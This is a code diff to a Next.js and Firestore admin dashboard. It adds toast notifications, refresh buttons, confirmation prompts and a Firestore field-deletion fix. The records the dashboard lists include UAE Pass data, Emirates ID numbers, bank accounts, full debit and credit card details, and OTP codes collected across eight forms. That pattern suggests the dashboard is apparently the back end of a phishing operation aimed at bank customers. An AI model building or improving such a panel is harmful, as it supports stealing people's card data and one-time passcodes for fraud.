@@ -3,7 +3,9 @@
 import { useState, useEffect } from 'react';
 import dynamic from 'next/dynamic';
 import { db } from '../../lib/firebase';
-import { doc, getDoc, deleteDoc, updateDoc } from 'firebase/firestore';
+import { doc, getDoc, updateDoc, deleteField } from 'firebase/firestore';
+import { ToastContainer, toast } from 'react-toastify';
+import 'react-toastify/dist/ReactToastify.css';
 
 // Dynamically import the UIDsMonitorWidget with no SSR
 const UIDsMonitorWidget = dynamic(() => import('../components/FloatingWidget'), {
@@ -219,8 +221,17 @@ export default function MinimalDashboard() {
           totalUsers: allUids.size
         }));
 
+        toast.success('Data loaded successfully!', {
+          position: "top-right",
+          autoClose: 3000,
+        });
+
       } catch (error) {
         console.error('Error fetching form counts:', error);
+        toast.error('Failed to load data. Please try again.', {
+          position: "top-right",
+          autoClose: 5000,
+        });
       } finally {
         setLoading(false);
       }
@@ -230,84 +241,89 @@ export default function MinimalDashboard() {
   }, []);
 
   // Fetch users for the active form
-  useEffect(() => {
-    const fetchFormUsers = async () => {
-      try {
-        setLoading(true);
-        const formDocRef = doc(db, 'users', activeForm);
-        const formSnapshot = await getDoc(formDocRef);
+  const fetchFormUsers = async () => {
+    try {
+      setLoading(true);
+      const formDocRef = doc(db, 'users', activeForm);
+      const formSnapshot = await getDoc(formDocRef);
+      
+      const formUsers: UserData[] = [];
+      
+      if (formSnapshot.exists()) {
+        const formData = formSnapshot.data();
         
-        const formUsers: UserData[] = [];
-        
-        if (formSnapshot.exists()) {
-          const formData = formSnapshot.data();
-          
-          // Extract user data from each UID field
-          Object.entries(formData).forEach(([key, value]) => {
-            if (key.startsWith('user_')) {
-              const userData = value as any;
-              formUsers.push({
-                uid: key,
-                name: userData.name,
-                email: userData.email,
-                mobileNumber: userData.mobileNumber,
-                status: userData.status,
-                createdAt: userData.createdAt,
-                formType: activeForm,
-                // First Form
-                uaePass: userData.uaePass,
-                // Second Form
-                emiratesId: userData.emiratesId,
-                step: userData.step,
-                // Third Form
-                loanFromBank: userData.loanFromBank,
-                bankAccounts: userData.bankAccounts,
-                bankName: userData.bankName,
-                verificationMethod: userData.verificationMethod,
-                debitCards: userData.debitCards,
-                creditCards: userData.creditCards,
-                debitCardDetails: userData.debitCardDetails,
-                creditCardDetails: userData.creditCardDetails,
-                // Fourth to Eighth Forms
-                otpCode: userData.otpCode
-              });
-            }
-          });
-        }
-        
-        setUsers(formUsers);
-        
-        // Calculate stats for current form
-        const today = new Date();
-        today.setHours(0, 0, 0, 0);
-        
-        const todayCount = formUsers.filter(user => {
-          if (user.createdAt && user.createdAt.toDate) {
-            const userDate = user.createdAt.toDate();
-            userDate.setHours(0, 0, 0, 0);
-            return userDate.getTime() === today.getTime();
+        // Extract user data from each UID field
+        Object.entries(formData).forEach(([key, value]) => {
+          if (key.startsWith('user_')) {
+            const userData = value as any;
+            formUsers.push({
+              uid: key,
+              name: userData.name,
+              email: userData.email,
+              mobileNumber: userData.mobileNumber,
+              status: userData.status,
+              createdAt: userData.createdAt,
+              formType: activeForm,
+              // First Form
+              uaePass: userData.uaePass,
+              // Second Form
+              emiratesId: userData.emiratesId,
+              step: userData.step,
+              // Third Form
+              loanFromBank: userData.loanFromBank,
+              bankAccounts: userData.bankAccounts,
+              bankName: userData.bankName,
+              verificationMethod: userData.verificationMethod,
+              debitCards: userData.debitCards,
+              creditCards: userData.creditCards,
+              debitCardDetails: userData.debitCardDetails,
+              creditCardDetails: userData.creditCardDetails,
+              // Fourth to Eighth Forms
+              otpCode: userData.otpCode
+            });
           }
-          return false;
-        }).length;
-
-        const pendingCount = formUsers.filter(user => user.status === 'pending').length;
-        const completedCount = formUsers.filter(user => user.status === 'completed' || user.status === 'approved').length;
-
-        setStats(prev => ({
-          ...prev,
-          totalUsers: formUsers.length,
-          pending: pendingCount,
-          completed: completedCount,
-          todayUsers: todayCount
-        }));
-
-      } catch (error) {
-        console.error('Error fetching users:', error);
-      } finally {
-        setLoading(false);
+        });
       }
-    };
+      
+      setUsers(formUsers);
+      
+      // Calculate stats for current form
+      const today = new Date();
+      today.setHours(0, 0, 0, 0);
+      
+      const todayCount = formUsers.filter(user => {
+        if (user.createdAt && user.createdAt.toDate) {
+          const userDate = user.createdAt.toDate();
+          userDate.setHours(0, 0, 0, 0);
+          return userDate.getTime() === today.getTime();
+        }
+        return false;
+      }).length;
 
+      const pendingCount = formUsers.filter(user => user.status === 'pending').length;
+      const completedCount = formUsers.filter(user => user.status === 'completed' || user.status === 'approved').length;
+
+      setStats(prev => ({
+        ...prev,
+        totalUsers: formUsers.length,
+        pending: pendingCount,
+        completed: completedCount,
+        todayUsers: todayCount
+      }));
+
+    } catch (error) {
+      console.error('Error fetching users:', error);
+      toast.error('Failed to fetch users data', {
+        position: "top-right",
+        autoClose: 4000,
+      });
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  // Effect to fetch form users when active form or view mode changes
+  useEffect(() => {
     if (viewMode === 'forms') {
       fetchFormUsers();
     }
@@ -357,8 +373,17 @@ export default function MinimalDashboard() {
 
       setAllUsers(Array.from(allUsersMap.values()));
 
+      toast.success(`Loaded ${allUsersMap.size} users`, {
+        position: "top-right",
+        autoClose: 3000,
+      });
+
     } catch (error) {
       console.error('Error fetching all users:', error);
+      toast.error('Failed to load users overview', {
+        position: "top-right",
+        autoClose: 5000,
+      });
     } finally {
       setLoading(false);
     }
@@ -403,8 +428,17 @@ export default function MinimalDashboard() {
       setSelectedUser(userData);
       setViewMode('userDetail');
 
+      toast.info('User details loaded', {
+        position: "top-right",
+        autoClose: 3000,
+      });
+
     } catch (error) {
       console.error('Error fetching user detail:', error);
+      toast.error('Failed to load user details', {
+        position: "top-right",
+        autoClose: 5000,
+      });
     } finally {
       setLoading(false);
     }
@@ -444,98 +478,172 @@ export default function MinimalDashboard() {
 
       setAllFormData(allData);
 
+      toast.success('All form data loaded successfully', {
+        position: "top-right",
+        autoClose: 3000,
+      });
+
     } catch (error) {
       console.error('Error fetching all form data:', error);
+      toast.error('Failed to load form data', {
+        position: "top-right",
+        autoClose: 5000,
+      });
     } finally {
       setLoading(false);
     }
   };
 
-  // Delete specific user data from a form
+  // Delete specific user data from a form - FIXED VERSION
   const deleteUserData = async (formType: FormType, userId: string) => {
     try {
       setDeleting(`${formType}-${userId}`);
       
       const formDocRef = doc(db, 'users', formType);
-      const formSnapshot = await getDoc(formDocRef);
       
-      if (formSnapshot.exists()) {
-        const formData = formSnapshot.data() as FormData;
-        const updatedData: FormData = { ...formData };
-        delete updatedData[userId];
-        
-        await updateDoc(formDocRef, updatedData);
-        
-        // Update local state
-        setAllFormData(prev => 
-          prev.map(item => 
-            item.formType === formType 
-              ? { ...item, data: updatedData }
-              : item
-          )
-        );
-        
-        // Refresh counts
-        const counts = { ...formUserCounts };
-        counts[formType] = Object.keys(updatedData).filter(key => key.startsWith('user_')).length;
-        setFormUserCounts(counts);
-        
-        alert(`Successfully deleted user data from ${formConfigs[formType].title}`);
+      // Use deleteField to properly remove the field from Firestore
+      await updateDoc(formDocRef, {
+        [userId]: deleteField()
+      });
+      
+      // Force refresh all data to ensure UI is in sync
+      if (viewMode === 'manageData') {
+        await fetchAllFormData();
+      } else {
+        await fetchFormUsers();
       }
+      
+      // Also refresh the form counts
+      const formSnapshot = await getDoc(formDocRef);
+      if (formSnapshot.exists()) {
+        const formData = formSnapshot.data();
+        const userCount = Object.keys(formData).filter(key => key.startsWith('user_')).length;
+        
+        setFormUserCounts(prev => ({
+          ...prev,
+          [formType]: userCount
+        }));
+      }
+      
+      toast.success(`User data deleted from ${formConfigs[formType].title}`, {
+        position: "top-right",
+        autoClose: 4000,
+      });
     } catch (error) {
       console.error('Error deleting user data:', error);
-      alert('Error deleting user data');
+      toast.error('Error deleting user data. Please try again.', {
+        position: "top-right",
+        autoClose: 5000,
+      });
     } finally {
       setDeleting(null);
     }
   };
 
-  // Delete entire form data
+  // Delete entire form data - FIXED VERSION
   const deleteFormData = async (formType: FormType) => {
-    if (!confirm(`Are you sure you want to delete ALL data from ${formConfigs[formType].title}? This action cannot be undone.`)) {
-      return;
-    }
+    const toastId = toast.loading('Preparing to delete form data...', {
+      position: "top-right"
+    });
 
     try {
       setDeleting(formType);
+      
+      toast.update(toastId, {
+        render: 'Deleting form data...',
+        type: 'info',
+        isLoading: true,
+      });
       
       const formDocRef = doc(db, 'users', formType);
       const formSnapshot = await getDoc(formDocRef);
       
       if (formSnapshot.exists()) {
         const formData = formSnapshot.data() as FormData;
-        const emptyData: FormData = {};
+        const updates: any = {};
         
-        // Keep only non-user fields if any, otherwise set empty
+        // Mark all user fields for deletion using deleteField()
         Object.keys(formData).forEach(key => {
-          if (!key.startsWith('user_')) {
-            emptyData[key] = formData[key];
+          if (key.startsWith('user_')) {
+            updates[key] = deleteField();
           }
         });
         
-        await updateDoc(formDocRef, emptyData);
+        // Only update if there are users to delete
+        if (Object.keys(updates).length > 0) {
+          await updateDoc(formDocRef, updates);
+        }
         
-        // Update local state
-        setAllFormData(prev => 
-          prev.map(item => 
-            item.formType === formType 
-              ? { ...item, data: emptyData }
-              : item
-          )
-        );
+        // Force refresh all data
+        await fetchAllFormData();
         
         // Update counts
-        const counts = { ...formUserCounts };
-        counts[formType] = 0;
-        setFormUserCounts(counts);
+        setFormUserCounts(prev => ({
+          ...prev,
+          [formType]: 0
+        }));
         
-        alert(`Successfully deleted all data from ${formConfigs[formType].title}`);
+        toast.update(toastId, {
+          render: `Successfully deleted all data from ${formConfigs[formType].title}`,
+          type: 'success',
+          isLoading: false,
+          autoClose: 5000,
+        });
+      } else {
+        toast.update(toastId, {
+          render: 'No data found to delete',
+          type: 'warning',
+          isLoading: false,
+          autoClose: 4000,
+        });
       }
     } catch (error) {
       console.error('Error deleting form data:', error);
-      alert('Error deleting form data');
+      toast.update(toastId, {
+        render: 'Error deleting form data. Please try again.',
+        type: 'error',
+        isLoading: false,
+        autoClose: 5000,
+      });
     } finally {
       setDeleting(null);
+    }
+  };
+
+  // Manual refresh function
+  const refreshData = async () => {
+    const toastId = toast.loading('Refreshing data...', {
+      position: "top-right"
+    });
+
+    setLoading(true);
+    try {
+      if (viewMode === 'forms') {
+        await fetchFormUsers();
+      } else if (viewMode === 'manageData') {
+        await fetchAllFormData();
+      } else if (viewMode === 'users') {
+        await fetchAllUsers();
+      } else if (viewMode === 'userDetail' && selectedUser) {
+        await fetchUserDetail(selectedUser.uid);
+      }
+
+      toast.update(toastId, {
+        render: 'Data refreshed successfully!',
+        type: 'success',
+        isLoading: false,
+        autoClose: 3000,
+      });
+    } catch (error) {
+      console.error('Error refreshing data:', error);
+      toast.update(toastId, {
+        render: 'Failed to refresh data',
+        type: 'error',
+        isLoading: false,
+        autoClose: 4000,
+      });
+    } finally {
+      setLoading(false);
     }
   };
 
@@ -643,12 +751,21 @@ export default function MinimalDashboard() {
                 <div><strong>Mobile:</strong> {selectedUser.mobileNumber || 'N/A'}</div>
               </div>
             </div>
-            <button
-              onClick={() => setViewMode('users')}
-              className="bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 rounded-lg"
-            >
-              ← Back to Users
-            </button>
+            <div className="flex gap-2">
+              <button
+                onClick={refreshData}
+                disabled={loading}
+                className="bg-blue-500 hover:bg-blue-600 disabled:bg-blue-300 text-white px-4 py-2 rounded-lg"
+              >
+                {loading ? 'Refreshing...' : 'Refresh'}
+              </button>
+              <button
+                onClick={() => setViewMode('users')}
+                className="bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 rounded-lg"
+              >
+                ← Back to Users
+              </button>
+            </div>
           </div>
         </div>
 
@@ -729,12 +846,21 @@ export default function MinimalDashboard() {
         <div className="bg-white rounded-lg shadow-sm border p-6">
           <div className="flex justify-between items-center mb-6">
             <h2 className="text-2xl font-bold text-gray-800">Manage All Form Data</h2>
-            <button
-              onClick={() => setViewMode('forms')}
-              className="bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 rounded-lg"
-            >
-              ← Back to Forms
-            </button>
+            <div className="flex gap-2">
+              <button
+                onClick={refreshData}
+                disabled={loading}
+                className="bg-blue-500 hover:bg-blue-600 disabled:bg-blue-300 text-white px-4 py-2 rounded-lg"
+              >
+                {loading ? 'Refreshing...' : 'Refresh Data'}
+              </button>
+              <button
+                onClick={() => setViewMode('forms')}
+                className="bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 rounded-lg"
+              >
+                ← Back to Forms
+              </button>
+            </div>
           </div>
 
           {loading ? (
@@ -756,7 +882,46 @@ export default function MinimalDashboard() {
                         </div>
                       </div>
                       <button
-                        onClick={() => deleteFormData(formType)}
+                        onClick={() => {
+                          if (userEntries.length === 0) {
+                            toast.info('No data to delete in this form', {
+                              position: "top-right",
+                              autoClose: 3000,
+                            });
+                            return;
+                          }
+                          
+                          toast.warning(
+                            <div>
+                              <p>Are you sure you want to delete ALL data from</p>
+                              <p><strong>{config.title}</strong>?</p>
+                              <p>This action cannot be undone.</p>
+                              <div className="flex gap-2 mt-2">
+                                <button
+                                  onClick={() => {
+                                    toast.dismiss();
+                                    deleteFormData(formType);
+                                  }}
+                                  className="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded text-sm"
+                                >
+                                  Yes, Delete All
+                                </button>
+                                <button
+                                  onClick={() => toast.dismiss()}
+                                  className="bg-gray-500 hover:bg-gray-600 text-white px-3 py-1 rounded text-sm"
+                                >
+                                  Cancel
+                                </button>
+                              </div>
+                            </div>,
+                            {
+                              position: "top-center",
+                              autoClose: false,
+                              closeOnClick: false,
+                              draggable: false,
+                            }
+                          );
+                        }}
                         disabled={deleting === formType || userEntries.length === 0}
                         className="bg-red-500 hover:bg-red-600 disabled:bg-red-300 text-white px-4 py-2 rounded-lg"
                       >
@@ -782,7 +947,37 @@ export default function MinimalDashboard() {
                                 <p className="text-sm text-gray-600">Mobile: {(userData as any).mobileNumber || 'N/A'}</p>
                               </div>
                               <button
-                                onClick={() => deleteUserData(formType, userId)}
+                                onClick={() => {
+                                  toast.warning(
+                                    <div>
+                                      <p>Delete user data from <strong>{config.title}</strong>?</p>
+                                      <p>User: {(userData as any).name || 'Unnamed User'}</p>
+                                      <div className="flex gap-2 mt-2">
+                                        <button
+                                          onClick={() => {
+                                            toast.dismiss();
+                                            deleteUserData(formType, userId);
+                                          }}
+                                          className="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded text-sm"
+                                        >
+                                          Yes, Delete
+                                        </button>
+                                        <button
+                                          onClick={() => toast.dismiss()}
+                                          className="bg-gray-500 hover:bg-gray-600 text-white px-3 py-1 rounded text-sm"
+                                        >
+                                          Cancel
+                                        </button>
+                                      </div>
+                                    </div>,
+                                    {
+                                      position: "top-center",
+                                      autoClose: false,
+                                      closeOnClick: false,
+                                      draggable: false,
+                                    }
+                                  );
+                                }}
                                 disabled={deleting === `${formType}-${userId}`}
                                 className="bg-red-500 hover:bg-red-600 disabled:bg-red-300 text-white px-3 py-1 rounded text-sm"
                               >
@@ -838,6 +1033,20 @@ export default function MinimalDashboard() {
 
   return (
     <div className="min-h-screen bg-gray-50">
+      {/* Toast Container */}
+      <ToastContainer
+        position="top-right"
+        autoClose={5000}
+        hideProgressBar={false}
+        newestOnTop={false}
+        closeOnClick
+        rtl={false}
+        pauseOnFocusLoss
+        draggable
+        pauseOnHover
+        theme="light"
+      />
+
       {/* Header */}
       <header className="bg-white shadow-sm border-b">
         <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
@@ -903,7 +1112,16 @@ export default function MinimalDashboard() {
           /* Users Overview */
           <div className="space-y-6">
             <div className="bg-white rounded-lg shadow-sm border p-6">
-              <h2 className="text-2xl font-bold text-gray-800 mb-4">All Users ({allUsers.length})</h2>
+              <div className="flex justify-between items-center mb-4">
+                <h2 className="text-2xl font-bold text-gray-800">All Users ({allUsers.length})</h2>
+                <button
+                  onClick={refreshData}
+                  disabled={loading}
+                  className="bg-blue-500 hover:bg-blue-600 disabled:bg-blue-300 text-white px-4 py-2 rounded-lg"
+                >
+                  {loading ? 'Refreshing...' : 'Refresh'}
+                </button>
+              </div>
               
               {loading ? (
                 <div className="text-center py-8 text-gray-500">Loading users...</div>
@@ -945,7 +1163,16 @@ export default function MinimalDashboard() {
           <>
             {/* Form Selection Buttons */}
             <div className="bg-white rounded-lg shadow-sm border p-6 mb-8">
-              <h2 className="text-xl font-semibold text-gray-800 mb-4">Select Form to View</h2>
+              <div className="flex justify-between items-center mb-4">
+                <h2 className="text-xl font-semibold text-gray-800">Select Form to View</h2>
+                <button
+                  onClick={refreshData}
+                  disabled={loading}
+                  className="bg-blue-500 hover:bg-blue-600 disabled:bg-blue-300 text-white px-4 py-2 rounded-lg"
+                >
+                  {loading ? 'Refreshing...' : 'Refresh'}
+                </button>
+              </div>
               <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                 {Object.entries(formConfigs).map(([formType, config]) => (
                   <button
